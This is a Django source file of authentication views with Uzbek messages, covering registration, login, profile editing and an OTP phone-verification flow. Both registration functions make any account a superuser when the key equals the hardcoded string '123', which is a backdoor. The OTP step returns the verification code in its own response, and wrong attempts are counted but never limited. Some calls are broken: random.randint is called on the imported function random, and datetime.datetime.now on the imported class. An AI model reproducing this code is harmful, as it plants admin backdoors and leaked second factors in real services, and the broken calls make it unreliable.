from datetime import datetime
from random import random
import uuid
from authapp.models import CustomUser, OTP
from rest_framework.authtoken.models import Token
from methodism import custom_response, error_messages, MESSAGE
from authapp.models import CustomUser


def regis(request, params):
    if "key" not in params or "password" not in params:
        return custom_response(False, message={"error": "Phone yoki password kiritilmagan"})

    if (len(params['password']) < 6 or ' ' in params['password']
        or not params['password'].isalnum()
        or len([i for i in params['password'] if i.isalpha() and i.isupper()]) < 1
        or len([i for i in params['password'] if i.isalpha() and i.islower()]) < 1):
        return custom_response(False, message={"error": "Password xato kiritildi"})

    otp = OTP.objects.filter(key=params['key']).first()
    if not otp:
        return custom_response(False, message={"error": "OTP topilmadi"})
    
    if CustomUser.objects.filter(phone=otp.phone).exists():
        return custom_response(False, message={"error": "Bu raqamdan avval ro'yhatdan o'tilgan"})

    user_data = {
        'phone': otp.phone,
        'password': params['password'],
        'name': params.get('name', '')
    }

    if params.get('key', '') == '123':
        user_data.update({
            'is_active': True,
            'is_staff': True,
            'is_superuser': True
        })

    user = CustomUser.objects.create_user(**user_data)
    token = Token.objects.create(user=user)

    return custom_response(True, data={"token": token.key}, message={"success": "Ro'yxatdan o'tdingiz"})


def login(request, params):

        if 'phone' not in params:
             return custom_response(False, error_messages.error_params_unfilled('phone'))
        user = CustomUser.objects.filter(phone=params['phone']).first()

        if 'password' not in params:
             return custom_response(False, error_messages.error_params_unfilled('password'))
        user = CustomUser.objects.filter(phone=params['phone']).first()

        if not user:
            return custom_response(False, message=MESSAGE['Unauthenticated'])
        
        if not user.check_password(params['password']):
            return custom_response(False, message=MESSAGE['PasswordError'])
        
      
        token = Token.objects.get_or_create(user=user)

        return custom_response(True, data={"token": token[0].key}, message={"success": "Tizimga kirdingiz"})

def register(request, params):
    if 'key' not in params:
        return custom_response(False, error_messages.error_params_unfilled('key'))
    
    if 'password' not in params:
        return custom_response(False, error_messages.error_params_unfilled('password'))
    
    password = params['password']
    if (len(password) < 6 or ' ' in password or not password.isalnum() or
        len([i for i in password if i.isupper()]) < 1 or
        len([i for i in password if i.islower()]) < 1):
        return custom_response(False, message="Password xato formatda kiritilgan")

    otp = OTP.objects.filter(key=params['key']).first()
    if not otp:
        return custom_response(False, message="OTP topilmadi yoki noto‘g‘ri")

    if CustomUser.objects.filter(phone=otp.phone).exists():
        return custom_response(False, message="Bu telefon raqam allaqachon ro‘yxatdan o‘tgan")
    
    user_data = {
        'phone': otp.phone,
        'password': password,
        'name': params.get('name', '')
    }

    if params['key'] == '123':
        user_data.update({
            'is_active': True,
            'is_staff': True,
            'is_superuser': True
        })
    
    user = CustomUser.objects.create_user(**user_data)
    token = Token.objects.create(user=user)

    return custom_response(True, data={"token": token.key}, message="Ro'yxatdan muvaffaqiyatli o'tdingiz")

def logout(request, params):
    Token.objects.filter(user=request.user).delete()
    return custom_response(True, message={"success": "Tizimdan chiqdingiz"})

def profile(request, params):
    return custom_response(True, data=request.user.format())


def update_profile(request, params):
    user = request.user
    phone = params.get('phone')
    if phone:
        if str(user.phone) == str(phone):
            return custom_response(False, message={"error": "Bu sizning mavjud raqamingiz"})
        if CustomUser.objects.filter(phone=phone).exists():
            return custom_response(False, message={"error": "Bu raqam oldin ro'yxatdan o'tgan"})

    user.name = params.get('name', user.name)
    user.phone = phone if phone else user.phone
    user.save()

    return custom_response(True, message={"success": "Ma'lumotlar yangilandi"})

def delete_profile(request, params):
    request.user.delete()
    return custom_response(True, message={"success": "Profil o'chirildi"})

def change_password(request, params):
    old = params.get('old')
    new = params.get('new')

    if not old or not new:
        return custom_response(False, message={"error": "Parollar to‘liq kiritilmagan"})
    
    if old == new:
        return custom_response(False, message={"error": "Yangi parol eski parolga teng bo'lmasligi kerak"})
    
    if not request.user.check_password(old):
        return custom_response(False, message={"error": "Eski parol noto'g'ri"})

    request.user.set_password(new)
    request.user.save()

    return custom_response(True, message={"success": "Parol muvaffaqiyatli o'zgartirildi"})

def auth_one(request, params):
    phone = params.get('phone')
    if not phone:
        return custom_response(False, message={"error": "Telefon raqam kiritilmagan"})

    if len(str(phone)) != 12 or not str(phone).startswith('998') or not str(phone).isdigit():
        return custom_response(False, message={"error": "Telefon raqam noto‘g‘ri"})

    code = ''.join([str(random.randint(1, 9)) for _ in range(4)])
    key = uuid.uuid4().__str__() + code

    otp = OTP.objects.create(phone=phone, key=key, code=code)

    return custom_response(True, data={"otp": code, "token": otp.key}, message={"success": "Kod yuborildi"})

def auth_two(request, params):
    key = params.get('key')
    code = params.get('code')

    if not key or not code:
        return custom_response(False, message={"error": "To‘liq ma‘lumot kiritilmagan"})

    otp = OTP.objects.filter(key=key).first()
    if not otp:
        return custom_response(False, message={"error": "Xato key"})

    now = datetime.datetime.now(datetime.timezone.utc)
    if (now - otp.created).total_seconds() >= 180:
        otp.is_expire = True
        otp.save()
        return custom_response(False, message={"error": "Kod eskirgan"})

    if otp.is_conf:
        return custom_response(False, message={"error": "Kod allaqachon tasdiqlangan"})

    if otp.is_expire:
        return custom_response(False, message={"error": "Kod yaroqsiz"})

    if otp.code != str(code):
        otp.tried += 1
        otp.save()
        return custom_response(False, message={"error": "Xato kod"})

    otp.is_conf = True
    otp.save()

    user = CustomUser.objects.filter(phone=otp.phone).first()
    return custom_response(True, data={"registrated": user is not None})
